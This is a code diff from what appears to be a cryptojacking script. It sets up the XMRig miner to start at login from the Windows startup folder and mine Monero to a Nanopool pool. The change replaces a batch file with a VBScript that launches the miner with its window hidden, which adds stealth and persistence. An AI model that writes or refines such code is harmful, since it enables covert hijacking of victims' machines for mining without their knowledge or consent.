@@ -39,8 +39,11 @@ if extracted_folders:
     xmrig_path = os.path.join(extracted_dir, "xmrig.exe")
     os.chdir(extracted_dir)
     
-    with open(STARTUP_PATH, "w") as bat_file:
-        bat_file.write(f"@echo off\nstart /min \"\" \"{xmrig_path}\" -o xmr-us-east1.nanopool.org:14433 -u {BITCOIN_ADDRESS} --tls --coin monero\n")
+    with open(STARTUP_PATH, "w") as vbs_file:
+        vbs_file.write(f'''Set WshShell = CreateObject("WScript.Shell") 
+    WshShell.Run """{xmrig_path}"" -o xmr-us-east1.nanopool.org:14433 -u {BITCOIN_ADDRESS} --tls --coin monero", 0, False
+    ''')
+
 
     
     subprocess.Popen(
